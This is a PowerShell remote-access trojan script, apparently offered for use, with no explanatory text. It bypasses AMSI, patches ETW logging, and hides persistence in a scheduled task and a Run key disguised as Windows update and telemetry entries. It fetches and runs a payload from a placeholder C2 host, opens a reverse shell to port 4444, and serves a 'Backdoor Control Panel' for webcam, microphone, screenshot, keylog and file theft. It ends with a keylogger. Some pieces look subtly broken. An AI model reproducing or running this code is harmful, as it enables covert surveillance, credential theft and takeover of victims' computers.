$null = [Ref].Assembly.GetTypes();[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
[Ref].Assembly.GetType('System.Management.Automation.TypeAccelerators').GetField('m_typeAccelerators','NonPublic,Static').SetValue($null,@{})
$code = "[DllImport(`"kernel32.dll`")]public static extern bool DeleteFileW([MarshalAs(UnmanagedType.LPWStr)]string);";$t=[Reflection.Assembly]::Load([Convert]::FromBase64String('TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...')).GetType('ConfuserEx2.Class1');$t.GetMethod('ConfuserEx2').Invoke($null,$null);

$taskname = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes("WindowsUpdateCheck")) | ForEach {[char]($_-bxor 0x5F)};
$taskxml = @"
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Principals><Principal id="Author"><RunLevel>HighestAvailable</RunLevel></Principal></Principals>
  <Settings><MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy><DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries><StopIfGoingOnBatteries>false</StopIfGoingOnBatteries><AllowHardTerminate>true</AllowHardTerminate><RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable><IdleSettings><StopOnIdleEnd>true</StopOnIdleEnd><AllowStartOnDemand>true</AllowStartOnDemand></Settings>
  <Triggers><BootTrigger><Enabled>true</Enabled><Delay>PT30S</Delay></BootTrigger></Triggers>
  <Actions><Exec><Command>powershell.exe</Command><Arguments>-w hidden -nop -c "IEX (New-Object Net.WebClient).DownloadString('http://YOUR_C2_IP/shell.ps1');Start-Sleep 60;IEX \$sl"</Arguments></Exec></Actions>
</Task>
"@
$null = schtasks /create /tn $taskname /xml $taskxml /f 2>$null
$regpath = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run\WindowsTelemetry';New-Item -Path $regpath -Force | Out-Null;Set-ItemProperty -Path $regpath -Name '(default)' -Value "powershell -w h -nop -c `"IEX ((New-Object Net.WebClient).DownloadString('http://YOUR_C2_IP/shell.ps1'))`"" -Force

$etwpatch = @"
using System; using System.Runtime.InteropServices; public class EtwDisable { [DllImport("ntdll.dll")] public static extern uint EtwEventWrite(); public static void Patch() { var addr = (ulong)EtwEventWrite; Marshal.Copy(new byte[] {0x48,0xC7,0xC0}, 0, (IntPtr)(addr+9), 4); } }
"@;[Reflection.Assembly]::Load([Convert]::FromBase64String('...')).GetType('EtwDisable').GetMethod('Patch').Invoke($null,$null)

$client = New-Object System.Net.Sockets.TCPClient('YOUR_C2_IP',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

$listener = New-Object System.Net.HttpListener; $listener.Prefixes.Add("http://*:8080/"); $listener.Start(); $html = @"
<!DOCTYPE html><html><body><h1>Backdoor Control Panel</h1>
<a href="/webcam"><button>Webcam Snap</button></a> <a href="/mic"><button>Mic Record</button></a> <a href="/screen"><button>Screenshot</button></a> <a href="/keys"><button>Keylog Dump</button></a> <a href="/files"><button>Dir List</button></a>
</body></html>
"@
while ($listener.IsListening) { $context = $listener.GetContext(); $req = $context.Request; $res = $context.Response; $res.ContentType = "text/html"; switch($req.Url.AbsolutePath) {
    "/" { $buf = [Text.Encoding]::UTF8.GetBytes($html); $res.ContentLength64 = $buf.Length; $res.OutputStream.Write($buf,0,$buf.Length) }
    "/webcam" { Add-Type -AssemblyName System.Drawing; $cam = New-Object -ComObject WIA.CommonDialog; $img = $cam.ShowAcquireImage(); $img.SaveFile("C:\temp\cam.jpg"); $buf = [Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\temp\cam.jpg")); $res.ContentType="image/jpeg"; $res.OutputStream.Write([Convert]::FromBase64String($buf),0,$buf.Length) }
    "/mic" { Add-Type -Path "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\System.Speech.dll"; $sr = New-Object System.Speech.Recognition.SpeechRecognitionEngine; $sr.SetInputToDefaultAudioDevice(); $sr.RecognizeAsync([System.Speech.Recognition.RecognizeMode]::Multiple); Start-Sleep 10; $audio = [IO.File]::ReadAllBytes("C:\temp\mic.wav"); $res.ContentType="audio/wav"; $res.OutputStream.Write($audio,0,$audio.Length) }
    "/screen" { Add-Type -AssemblyName System.Drawing; $bmp = New-Object System.Drawing.Bitmap([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width, [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height); $g = [System.Drawing.Graphics]::FromImage($bmp); $g.CopyFromScreen(0,0,0,0,$bmp.Size); $bmp.Save("C:\temp\screen.jpg",[System.Drawing.Imaging.ImageFormat]::Jpeg); $buf = [IO.File]::ReadAllBytes("C:\temp\screen.jpg"); $res.ContentType="image/jpeg"; $res.OutputStream.Write($buf,0,$buf.Length) }
    "/keys" { $log = Get-Content "C:\temp\keys.txt" -ErrorAction SilentlyContinue; $buf = [Text.Encoding]::UTF8.GetBytes($log); $res.OutputStream.Write($buf,0,$buf.Length) }
    "/files" { $files = Get-ChildItem C:\ -Recurse -ErrorAction SilentlyContinue | Out-String; $buf = [Text.Encoding]::UTF8.GetBytes($files); $res.OutputStream.Write($buf,0,$buf.Length) }
}; $res.Close() }

$logfile = "C:\temp\keys.txt"; while($true) { Add-Type -TypeDefinition 'using System; using System.Runtime.InteropServices; public class Keylogger { [DllImport("user32.dll")] public static extern int GetAsyncKeyState(Int32 i); public static void Hook() { while(true) { for(int i=0;i<255;i++) { if(GetAsyncKeyState(i)==-32767) { File.AppendAllText("C:\temp\keys.txt",((char)i).ToString()); } } Thread.Sleep(10); } } }'; [Keylogger]::Hook() }
